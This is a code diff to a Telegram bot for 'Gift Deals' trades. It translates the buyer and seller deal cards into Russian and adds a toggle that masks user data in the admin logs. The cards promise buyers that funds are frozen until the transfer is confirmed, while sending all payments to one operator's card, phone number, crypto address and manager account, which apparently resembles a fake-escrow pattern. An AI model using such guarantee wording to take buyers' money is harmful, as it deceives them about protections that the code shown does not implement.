@@ -994,12 +994,12 @@ def build_buyer_card(deal_id, d, seller_tag, lang="ru"):
     item_str = f"\n{item.strip()}" if item.strip() else ""
     ru = lang == "ru"
     CUR_FULL = {
-        "TON": "Toncoin (TON)", "USDT": "Tether (USDT)",
-        "Stars": "Telegram Stars ⭐", "RUB": "Russian Ruble (RUB)",
-        "KZT": "Kazakhstani Tenge (KZT)", "AZN": "Azerbaijani Manat (AZN)",
-        "KGS": "Kyrgyzstani Som (KGS)", "UZS": "Uzbekistani Sum (UZS)",
-        "TJS": "Tajikistani Somoni (TJS)", "BYN": "Belarusian Ruble (BYN)",
-        "UAH": "Ukrainian Hryvnia (UAH)", "GEL": "Georgian Lari (GEL)",
+        "TON": "TON", "USDT": "USDT",
+        "Stars": "⭐ Звёзды", "RUB": "🇷🇺 Рубли",
+        "KZT": "🇰🇿 Теңге", "AZN": "🇦🇿 Manat",
+        "KGS": "🇰🇬 Сом", "UZS": "🇺🇿 So'm",
+        "TJS": "🇹🇯 Сомонӣ", "BYN": "🇧🇾 Рублі",
+        "UAH": "🇺🇦 Гривні", "GEL": "🇬🇪 ლარი",
     }
     cur_full = CUR_FULL.get(cur, cur)
     try:
@@ -1014,32 +1014,32 @@ def build_buyer_card(deal_id, d, seller_tag, lang="ru"):
         s_status_line = f"\n{ce('5438496463044752972','⭐️')} <b>{s_status}</b>" if s_status else ""
         s_reviews_text = ("\n\n" + "\n".join(f"  • {r}" for r in s_reviews[-3:])) if s_reviews else ""
         stats_block = (
-            f"{ce('5199552030615558774','👤')} <b>Seller</b>\n"
+            f"{ce('5199552030615558774','👤')} <b>Продавец</b>\n"
             f"<blockquote>"
             f"<b>{seller_tag}</b>{s_status_line}\n"
-            f"{ce('5274055917766202507','✅')} Deals: <b>{s_deals}</b>\n"
-            f"{ce('5278467510604160626','💰')} Turnover: <b>{s_turnover}</b>\n"
-            f"{ce('5463289097336405244','⭐️')} Rep: <b>{s_rep}</b>\n"
-            f"{ce('5303138782004924588','💬')} Reviews: <b>{len(s_reviews)}</b>{s_reviews_text}"
+            f"{ce('5274055917766202507','✅')} Сделок: <b>{s_deals}</b>\n"
+            f"{ce('5278467510604160626','💰')} Оборот: <b>{s_turnover}</b>\n"
+            f"{ce('5463289097336405244','⭐️')} Репутация: <b>{s_rep}</b>\n"
+            f"{ce('5303138782004924588','💬')} Отзывов: <b>{len(s_reviews)}</b>{s_reviews_text}"
             f"</blockquote>\n\n"
         )
     except:
-        stats_block = f"{ce('5199552030615558774','👤')} <b>Seller</b>\n<blockquote><b>{seller_tag}</b></blockquote>\n\n"
+        stats_block = f"{ce('5199552030615558774','👤')} <b>Продавец</b>\n<blockquote><b>{seller_tag}</b></blockquote>\n\n"
     return (
-        f"{E['deal']} <b>Deal #{deal_id}</b>\n\n"
-        f"<b>Type:</b> {tname(dtype, 'en')}{item_str}\n"
-        f"<b>Amount:</b> {amt} {cur_full}\n\n"
+        f"{E['deal']} <b>Сделка #{deal_id}</b>\n\n"
+        f"<b>Тип:</b> {tname(dtype, lang)}{item_str}\n"
+        f"<b>Сумма:</b> {amt} {cur_full}\n\n"
         f"{stats_block}"
-        f"{E['security_e']} <b>Security guarantee</b>\n"
-        f"<blockquote><b>Funds are frozen until the transfer is confirmed. The deal is protected by Gift Deals.</b></blockquote>\n\n"
-        f"{E['warning']} <b>Important:</b>\n"
-        f"<blockquote><b>Do not transfer goods directly! Only through @GiftDealsManager.</b></blockquote>\n\n"
-        f"{E['requisites']} <b>SBP / Card {CARD_BANK}:</b>\n"
-        f"<blockquote><b>Phone: <code>{CARD_NUMBER}</code>\nRecipient: {CARD_NAME}\nBank: {CARD_BANK}</b></blockquote>\n\n"
+        f"{E['security_e']} <b>Гарантия безопасности</b>\n"
+        f"<blockquote><b>Средства заморожены до подтверждения передачи. Сделка защищена платформой Gift Deals.</b></blockquote>\n\n"
+        f"{E['warning']} <b>Важно:</b>\n"
+        f"<blockquote><b>Не передавайте товар напрямую! Только через менеджера @GiftDealsManager.</b></blockquote>\n\n"
+        f"{E['requisites']} <b>СБП / Карта {CARD_BANK}:</b>\n"
+        f"<blockquote><b>Телефон: <code>{CARD_NUMBER}</code>\nПолучатель: {CARD_NAME}\nБанк: {CARD_BANK}</b></blockquote>\n\n"
         f"{E['tonkeeper']} <b>TON / USDT:</b>\n"
-        f"<blockquote><b>TON address:\n<code>{CRYPTO_ADDRESS}</code>\n\n{E['cryptobot']} Crypto bot: {CRYPTO_BOT}</b></blockquote>\n\n"
-        f"⭐ <b>Stars / NFT:</b>\n"
-        f"<blockquote><b>Send stars to manager: @GiftDealsManager</b></blockquote>\n\n"
+        f"<blockquote><b>TON адрес:\n<code>{CRYPTO_ADDRESS}</code>\n\n{E['cryptobot']} Крипто бот: {CRYPTO_BOT}</b></blockquote>\n\n"
+        f"⭐ <b>Звёзды / NFT:</b>\n"
+        f"<blockquote><b>Отправьте звёзды менеджеру: @GiftDealsManager</b></blockquote>\n\n"
         f"<tg-emoji emoji-id='5206607081334906820'>✅</tg-emoji> {'После перевода нажмите «Я оплатил»' if ru else 'After payment press «I paid»'}"
     )
 
@@ -1090,38 +1090,38 @@ async def send_deal_card(update, context, deal_id, d, buyer=False):
             b_reviews_text = ("\n\n" + "\n".join(f"  • {r}" for r in b_reviews[-3:])) if b_reviews else ""
 
             text = (
-                f"{E['deal']} <b>Deal #{deal_id}</b>\n\n"
-                f"<b>Type:</b> {tname(dtype, 'en')}{item_str}\n"
-                f"<b>Amount:</b> {amt} {cur_full}\n\n"
+                f"{E['deal']} <b>Сделка #{deal_id}</b>\n\n"
+                f"<b>Тип:</b> {tname(dtype, lang)}{item_str}\n"
+                f"<b>Сумма:</b> {amt} {cur_full}\n\n"
 
-                f"{ce('5199552030615558774','👤')} <b>Seller</b>\n"
+                f"{ce('5199552030615558774','👤')} <b>Продавец</b>\n"
                 f"<blockquote>"
                 f"<b>{seller_display}</b>{s_status_line}\n"
-                f"{ce('5274055917766202507','✅')} Deals: <b>{s_deals}</b>\n"
-                f"{ce('5278467510604160626','💰')} Turnover: <b>{s_turnover}</b>\n"
-                f"{ce('5463289097336405244','⭐️')} Rep: <b>{s_rep}</b>\n"
-                f"{ce('5303138782004924588','💬')} Reviews: <b>{len(s_reviews)}</b>{s_reviews_text}"
+                f"{ce('5274055917766202507','✅')} Сделок: <b>{s_deals}</b>\n"
+                f"{ce('5278467510604160626','💰')} Оборот: <b>{s_turnover}</b>\n"
+                f"{ce('5463289097336405244','⭐️')} Репутация: <b>{s_rep}</b>\n"
+                f"{ce('5303138782004924588','💬')} Отзывов: <b>{len(s_reviews)}</b>{s_reviews_text}"
                 f"</blockquote>\n\n"
 
-                f"{ce('5199552030615558774','👤')} <b>Buyer</b>\n"
+                f"{ce('5199552030615558774','👤')} <b>Покупатель</b>\n"
                 f"<blockquote>"
                 f"<b>{buyer_display}</b>\n"
-                f"{ce('5274055917766202507','✅')} Deals: <b>{b_deals}</b>\n"
-                f"{ce('5278467510604160626','💰')} Turnover: <b>{b_turnover}</b>\n"
-                f"{ce('5463289097336405244','⭐️')} Rep: <b>{b_rep}</b>\n"
-                f"{ce('5303138782004924588','💬')} Reviews: <b>{len(b_reviews)}</b>{b_reviews_text}"
+                f"{ce('5274055917766202507','✅')} Сделок: <b>{b_deals}</b>\n"
+                f"{ce('5278467510604160626','💰')} Оборот: <b>{b_turnover}</b>\n"
+                f"{ce('5463289097336405244','⭐️')} Репутация: <b>{b_rep}</b>\n"
+                f"{ce('5303138782004924588','💬')} Отзывов: <b>{len(b_reviews)}</b>{b_reviews_text}"
                 f"</blockquote>\n\n"
 
-                f"{E['security_e']} <b>Security guarantee</b>\n"
-                f"<blockquote><b>Funds are frozen until the transfer is confirmed. The deal is protected by Gift Deals.</b></blockquote>\n\n"
-                f"{E['warning']} <b>Important:</b>\n"
-                f"<blockquote><b>Do not transfer goods directly! Only through @GiftDealsManager.</b></blockquote>\n\n"
-                f"{E['requisites']} <b>SBP / Card {CARD_BANK}:</b>\n"
-                f"<blockquote><b>Phone: <code>{CARD_NUMBER}</code>\nRecipient: {CARD_NAME}\nBank: {CARD_BANK}</b></blockquote>\n\n"
+                f"{E['security_e']} <b>Гарантия безопасности</b>\n"
+                f"<blockquote><b>Средства заморожены до подтверждения передачи. Сделка защищена платформой Gift Deals.</b></blockquote>\n\n"
+                f"{E['warning']} <b>Важно:</b>\n"
+                f"<blockquote><b>Не передавайте товар напрямую! Только через менеджера @GiftDealsManager.</b></blockquote>\n\n"
+                f"{E['requisites']} <b>СБП / Карта {CARD_BANK}:</b>\n"
+                f"<blockquote><b>Телефон: <code>{CARD_NUMBER}</code>\nПолучатель: {CARD_NAME}\nБанк: {CARD_BANK}</b></blockquote>\n\n"
                 f"{E['tonkeeper']} <b>TON / USDT:</b>\n"
-                f"<blockquote><b>TON address:\n<code>{CRYPTO_ADDRESS}</code>\n\n{E['cryptobot']} Crypto bot: {CRYPTO_BOT}</b></blockquote>\n\n"
-                f"⭐ <b>Stars / NFT:</b>\n"
-                f"<blockquote><b>Send stars to manager: @GiftDealsManager</b></blockquote>\n\n"
+                f"<blockquote><b>TON адрес:\n<code>{CRYPTO_ADDRESS}</code>\n\n{E['cryptobot']} Крипто бот: {CRYPTO_BOT}</b></blockquote>\n\n"
+                f"⭐ <b>Звёзды / NFT:</b>\n"
+                f"<blockquote><b>Отправьте звёзды менеджеру: @GiftDealsManager</b></blockquote>\n\n"
                 f"<tg-emoji emoji-id='5206607081334906820'>✅</tg-emoji> {'После перевода нажмите «Я оплатил»' if ru else 'After payment press «I paid»'}"
             )
             kb = InlineKeyboardMarkup([
@@ -1156,31 +1156,31 @@ async def send_deal_card(update, context, deal_id, d, buyer=False):
             b_reviews_text = ("\n\n" + "\n".join(f"  • {r}" for r in b_reviews[-3:])) if b_reviews else ""
 
             text = (
-                f"<tg-emoji emoji-id='5206607081334906820'>✅</tg-emoji> <b>Deal created #{deal_id}</b>\n\n"
-                f"<b>Type:</b> {tname(dtype, 'en')}{item_str}\n"
-                f"<b>Amount:</b> {amt} {cur_full}\n\n"
+                f"<tg-emoji emoji-id='5206607081334906820'>✅</tg-emoji> <b>Сделка создана #{deal_id}</b>\n\n"
+                f"<b>Тип:</b> {tname(dtype, lang)}{item_str}\n"
+                f"<b>Сумма:</b> {amt} {cur_full}\n\n"
 
-                f"{ce('5199552030615558774','👤')} <b>Seller</b>\n"
+                f"{ce('5199552030615558774','👤')} <b>Продавец</b>\n"
                 f"<blockquote>"
                 f"<b>{seller_display}</b>{s_status_line}\n"
-                f"{ce('5274055917766202507','✅')} Deals: <b>{s_deals}</b>\n"
-                f"{ce('5278467510604160626','💰')} Turnover: <b>{s_turnover}</b>\n"
-                f"{ce('5463289097336405244','⭐️')} Rep: <b>{s_rep}</b>\n"
-                f"{ce('5303138782004924588','💬')} Reviews: <b>{len(s_reviews)}</b>{s_reviews_text}"
+                f"{ce('5274055917766202507','✅')} Сделок: <b>{s_deals}</b>\n"
+                f"{ce('5278467510604160626','💰')} Оборот: <b>{s_turnover}</b>\n"
+                f"{ce('5463289097336405244','⭐️')} Репутация: <b>{s_rep}</b>\n"
+                f"{ce('5303138782004924588','💬')} Отзывов: <b>{len(s_reviews)}</b>{s_reviews_text}"
                 f"</blockquote>\n\n"
 
-                f"{ce('5199552030615558774','👤')} <b>Buyer</b>\n"
+                f"{ce('5199552030615558774','👤')} <b>Покупатель</b>\n"
                 f"<blockquote>"
                 f"<b>{partner}</b>\n"
-                f"{ce('5274055917766202507','✅')} Deals: <b>{b_deals}</b>\n"
-                f"{ce('5278467510604160626','💰')} Turnover: <b>{b_turnover}</b>\n"
-                f"{ce('5463289097336405244','⭐️')} Rep: <b>{b_rep}</b>\n"
-                f"{ce('5303138782004924588','💬')} Reviews: <b>{len(b_reviews)}</b>{b_reviews_text}"
+                f"{ce('5274055917766202507','✅')} Сделок: <b>{b_deals}</b>\n"
+                f"{ce('5278467510604160626','💰')} Оборот: <b>{b_turnover}</b>\n"
+                f"{ce('5463289097336405244','⭐️')} Репутация: <b>{b_rep}</b>\n"
+                f"{ce('5303138782004924588','💬')} Отзывов: <b>{len(b_reviews)}</b>{b_reviews_text}"
                 f"</blockquote>\n\n"
 
-                f"{E['deal_link']} Link for buyer:\n"
+                f"{E['deal_link']} Ссылка для покупателя:\n"
                 f"<code>https://t.me/{BOT_USERNAME}?start=deal_{deal_id}</code>\n\n"
-                f"{'Отправьте ссылку партнёру.' if ru else 'Send the link to your partner.'}"
+                f"Отправьте ссылку партнёру."
             )
             kb = InlineKeyboardMarkup([
                 [InlineKeyboardButton("🏠 " + ("Главное меню" if ru else "Main menu"), callback_data="main_menu")]
@@ -1543,8 +1543,7 @@ def adm_kb():
         [InlineKeyboardButton("🖼 Баннеры по разделам", callback_data="adm_banners")],
         [InlineKeyboardButton("✏️ Описание меню", callback_data="adm_menu_desc")],
         [InlineKeyboardButton("🗂 Список сделок", callback_data="adm_deals")],
-        [InlineKeyboardButton("📋 Логи событий", callback_data="adm_logs"),
-         InlineKeyboardButton("📋 Логи (скрыт.)", callback_data="adm_logs_hidden")],
+        [InlineKeyboardButton("📋 Логи событий", callback_data="adm_logs")],
         [InlineKeyboardButton("📡 Настройка лог-канала", callback_data="adm_log_channel")],
     ])
 
@@ -1666,24 +1665,40 @@ async def handle_adm_cb(update, context):
             await q.answer("✅ Обновлено")
             return
 
-        if d in ("adm_logs","adm_logs_hidden"):
-            hidden = d == "adm_logs_hidden"; db = load_db()
-            logs = db.get("logs",[])[-20:][::-1]
+        if d in ("adm_logs", "adm_logs_hidden", "adm_logs_toggle"):
+            db = load_db()
+            # Toggle hidden state
+            if d == "adm_logs_toggle":
+                db["log_hidden"] = not db.get("log_hidden", False)
+                save_db(db)
+            hidden = db.get("log_hidden", False)
+
+            logs = db.get("logs", [])[-20:][::-1]
             if not logs:
                 await q.message.edit_text("<b>Логов пока нет.</b>", parse_mode="HTML",
                     reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Назад", callback_data="adm_back")]]))
                 return
-            lines = ["<b>📋 Последние события:</b>\n"]
+
+            status_icon = "🙈" if hidden else "👁"
+            status_text = "Данные скрыты" if hidden else "Данные открыты"
+            lines = [f"<b>📋 Последние события</b> | {status_icon} {status_text}:\n"]
             for log in logs:
-                uname = mask(f"@{log['username']}") if hidden and log.get('username') else (f"@{log['username']}" if log.get('username') else "")
-                uid_str = mask(log['uid']) if hidden and log.get('uid') else (f"<code>{log['uid']}</code>" if log.get('uid') else "")
-                deal = f" #{log['deal_id']}" if log.get('deal_id') else ""
+                if hidden:
+                    uname = mask(f"@{log['username']}") if log.get('username') else ""
+                    uid_str = mask(log['uid']) if log.get('uid') else ""
+                    deal = f" #***{log['deal_id'][-3:]}" if log.get('deal_id') else ""
+                else:
+                    uname = f"@{log['username']}" if log.get('username') else ""
+                    uid_str = f"<code>{log['uid']}</code>" if log.get('uid') else ""
+                    deal = f" #{log['deal_id']}" if log.get('deal_id') else ""
                 extra = f" — {log['extra']}" if log.get('extra') else ""
                 lines.append(f"<b>{log['time']}</b> {log['event']}{deal}\n{uname} {uid_str}{extra}\n")
+
             txt = "\n".join(lines)[:4000]
+            toggle_label = "👁 Показать всё" if hidden else "🙈 Скрыть данные"
             await q.message.edit_text(txt, parse_mode="HTML", reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("👁 Показать реальные" if hidden else "🙈 Скрыть данные",
-                                      callback_data="adm_logs" if hidden else "adm_logs_hidden")],
+                [InlineKeyboardButton(toggle_label, callback_data="adm_logs_toggle")],
+                [InlineKeyboardButton("🔄 Обновить", callback_data="adm_logs")],
                 [InlineKeyboardButton("🔙 Назад", callback_data="adm_back")]
             ]))
             return
